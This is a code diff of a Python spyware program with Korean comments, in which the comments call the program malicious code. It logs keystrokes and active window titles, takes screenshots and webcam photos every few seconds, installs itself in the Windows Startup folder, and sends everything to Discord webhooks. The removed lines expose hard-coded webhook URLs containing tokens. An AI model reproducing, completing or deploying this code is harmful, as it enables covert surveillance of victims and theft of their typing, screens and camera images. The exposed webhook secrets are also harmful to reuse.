@@ -15,22 +15,25 @@ import pyautogui
 import requests
 import base64
 
-global keylog,lim,tab,crpass,filenameforexe,version,path
+global keylog,lim,tab,crpass,filenameforexe,version,path,screenshot_delay,camshot_delay
 keylog = ""
 filenameforexe = "최종 .exe 파일 이름"
-lim = 1970
-LURL = ""
-LURL2 = "https://discordapp.com/api/webhooks/943844790578077706/TG6gl6I05ay4NMtRXSvBEulSwDE4XIaVt56bmduzmMpTZqx_ZW4H_S9ZLt9eH5Xn0ulD"
-LURL3 = "https://discordapp.com/api/webhooks/943845676301844510/iI1lbmwJOWrfO2uminNWV159rbORIaURWR7rTTmgHKkc0-wnpat7zXCJjZKqEecLawfh"
-LURL4 = "https://discordapp.com/api/webhooks/943857139741515836/49Lpj3Hq5e22A-nQSIl6B9wxIi_OmJJNCZ22N_tUlPI_wkrmcyxTpAErGswyUD16S1eM"
+lim = 1970 #키로깅할때 몇자이상 타자를 쳤을 경우 키로그를 보낼지
+LURL = "키로거내용을 받을 웹훅 링크"
+LURL2 = "창 정보를 받을 웹훅 링크"
+LURL3 = "기록(스크린샷,캠)을 받을 웹훅링크"
 LNAME = getpass.getuser()
-tab = ""
-path = "image"
+tab = "" #그냥 현재탭에 변화가있나를 확인할려고 만듦
+path = "screenshot.jpg 및 camshot.jpg가 생성되어 불러와질 파일"
+screenshot_delay = 10 #스크린샷 딜레이
+camshot_delay = 10.25 #캠샷 딜레이
 
+#웹훅에 메시지 보내기 (target = URL)
 def send(message,target) -> None:
     sendall = DiscordWebhook(url=target, content=message, username=LNAME)
     sendall.execute()
 
+#사진을 emb에 넣은후 메시지로 보네기 (image_file = path\screenshot.jpg,path\camshot.jpg)
 def send_image_to_discord(image_file, url):
     try:
         webhook = DiscordWebhook(url=url)
@@ -44,11 +47,12 @@ def send_image_to_discord(image_file, url):
     except:
         logging("ERROR | sending screenshot is Fail")
 
+#로그기록을 보네기
 def logging(message):
     now = time.localtime()
     message = f"{message} | {now.tm_year}/{now.tm_mon}/{now.tm_mday} {now.tm_hour}:{now.tm_min}:{now.tm_sec}"
     send(message,LURL3)
-
+#키보드를 눌렀을 경우 함수
 def on_press(Key):
     global keylog, lim
     try:
@@ -61,11 +65,12 @@ def on_press(Key):
     except:
         logging("ERROR | KeyLogging is Fail")
 
-
+#키보드를 눌르면 이벤트가 발생되 on_press로 넘어감
 def listener_c():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
+#시작프로그램 파일에 해당 악성코드를 넣어 시작할때마다 이파일을 실행시킴
 def startup():
     global filenameforexe
     PATH = f"C:\\Users\\{LNAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
@@ -79,6 +84,7 @@ def startup():
     else:
         logging(f"FAIL | copy_move {end_PATH} -> {PATH} is fail cause dir isn't there")
 
+#사용중인창의 내용을 가져오는함수
 def Tab():
     global tab
     try:
@@ -93,20 +99,22 @@ def whiling():
         Tab()
         time.sleep(0.01)
 
+#스크린샷을 찍고 웹훅으로 보넴
 def screenshot():
     global path
     try:
         pyautogui.screenshot(f"{path}\\screenshot.jpg")
-        send_image_to_discord(image_file=f"{path}\\screenshot.jpg",url=LURL3)
+        send_image_to_discord(f"{path}\\screenshot.jpg",LURL3)
         os.remove(f"{path}\\screenshot.jpg")
     except:
         logging("ERROR | Get ScreenShot is Fail")
 
+#캠을 찍고 웹훅으로 보넴
 def camshoot():
     global path
     try:
         try:
-            cap = cv2.VideoCapture(0)  # 노트북 웹캠을 카메라로 사용
+            cap = cv2.VideoCapture(0)  # 캠을 카메라로 사용
         except:
             logging("ERROR | This Computer hasn't cam")
         cap.set(3, 640)  # 너비
@@ -121,16 +129,21 @@ def camshoot():
     except:
         logging("ERROR | CamShoot is Fail")
 
+#스크린샷을 10초마다 함
 def listener_screenshot():
+    global screenshot_delay
     while True:
         screenshot()
-        time.sleep(10)
+        time.sleep(screenshot_delay)
 
+#캠샷을 10초마다함
 def listener_camshot():
+    global camshot_delay
     while True:
         camshoot()
-        time.sleep(10.25)
+        time.sleep(camshot_delay)
 
+#감염 컴퓨터의 IP를 가져온다
 def Get_IP():
     logging(f"Grabbing | {socket.gethostbyname(socket.gethostname())}")
 
